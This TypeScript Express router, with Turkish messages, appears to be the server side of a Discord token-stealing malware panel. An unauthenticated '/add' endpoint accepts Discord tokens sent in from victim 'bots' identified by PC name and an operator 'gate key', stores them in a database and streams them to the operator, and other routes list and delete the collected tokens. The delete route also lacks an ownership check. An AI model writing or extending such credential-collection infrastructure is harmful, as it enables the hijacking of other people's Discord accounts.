import { Router, Request, Response } from 'express';
import { pool } from '../db';
import { authenticateToken, AuthRequest } from '../middleware/auth';

const router = Router();

router.get('/', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  try {
    const result = await pool.query(
      `SELECT dt.* FROM discord_tokens dt 
       JOIN bots b ON dt.bot_id = b.id 
       WHERE b.user_id = $1 
       ORDER BY dt.created_at DESC`,
      [req.user?.id]
    );
    return res.json({ success: true, tokens: result.rows });
  } catch (error) {
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.post('/add', async (req: Request, res: Response): Promise<Response> => {
  const { gateKey, pcName, token } = req.body;

  if (!gateKey || !token) {
    return res.status(400).json({ success: false, message: 'Eksik parametre.' });
  }

  try {
    const userRes = await pool.query('SELECT id FROM users WHERE gate_key = $1', [gateKey]);
    if (userRes.rows.length === 0) {
      return res.status(401).json({ success: false, message: 'Geçersiz Gate Key.' });
    }

    const botRes = await pool.query('SELECT id FROM bots WHERE user_id = $1 AND pc_name = $2', [userRes.rows[0].id, pcName || 'Windows PC']);
    const botId = botRes.rows.length > 0 ? botRes.rows[0].id : null;

    await pool.query(
      'INSERT INTO discord_tokens (bot_id, pc_name, token) VALUES ($1, $2, $3) ON CONFLICT (token) DO NOTHING',
      [botId, pcName || 'Windows PC', token]
    );

    const { broadcastDiscordTokensUpdate } = require('../index');
    await broadcastDiscordTokensUpdate(userRes.rows[0].id);

    return res.json({ success: true, message: 'Token kaydedildi.' });
  } catch (error) {
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

router.delete('/:id', authenticateToken, async (req: AuthRequest, res: Response): Promise<Response> => {
  const tokenId = req.params.id;
  const userId = req.user?.id;

  try {
    await pool.query('DELETE FROM discord_tokens WHERE id = $1', [tokenId]);
    if (userId) {
      const { broadcastDiscordTokensUpdate } = require('../index');
      await broadcastDiscordTokensUpdate(userId);
    }
    return res.json({ success: true, message: 'Token silindi.' });
  } catch (error) {
    return res.status(500).json({ success: false, message: 'Sunucu hatası.' });
  }
});

export default router;